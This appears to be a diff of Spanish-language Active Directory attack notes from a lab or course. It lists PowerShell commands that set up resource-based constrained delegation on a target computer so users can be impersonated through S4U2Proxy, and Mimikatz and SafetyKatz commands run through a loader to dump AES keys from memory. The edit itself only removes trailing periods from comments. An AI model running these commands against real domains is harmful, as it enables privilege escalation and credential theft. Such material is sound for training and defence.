@@ -23,18 +23,18 @@ Para abusar de **RBCD (Resource-Based Constrained Delegation)** de la forma más
 
 ❯ $comps = 'dcorp-student1$','dcorp-student2$'
 ❯ Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
-# Configurar RBCD en el equipo objetivo — permite que las máquinas especificadas deleguen en su nombre para abusar de S4U2Proxy e impersonar usuarios.
+# Configurar RBCD en el equipo objetivo — permite que las máquinas especificadas deleguen en su nombre para abusar de S4U2Proxy e impersonar usuarios
 
 ❯ Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student1$' -Verbose
-# Configurar RBCD en el equipo objetivo usando PowerView — permite que dcorp-student1$ delegue en su nombre para abusar de S4U2Proxy.
+# Configurar RBCD en el equipo objetivo usando PowerView — permite que dcorp-student1$ delegue en su nombre para abusar de S4U2Proxy
 
 ❯ Get-DomainRBCD
-# Enumerar todos los objetos del dominio que tienen RBCD configurado — verifica que la configuración fue aplicada correctamente.
+# Enumerar todos los objetos del dominio que tienen RBCD configurado — verifica que la configuración fue aplicada correctamente
 
 ! Usuario: Administrador local de la máquina atacante
 ❯ Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
-# Extraer las claves AES de todas las cuentas en memoria — obtener la AES key de la cuenta de máquina para usarla en el ataque S4U.
+# Extraer las claves AES de todas las cuentas en memoria — obtener la AES key de la cuenta de máquina para usarla en el ataque S4U
 ```
 
 ```powershell 
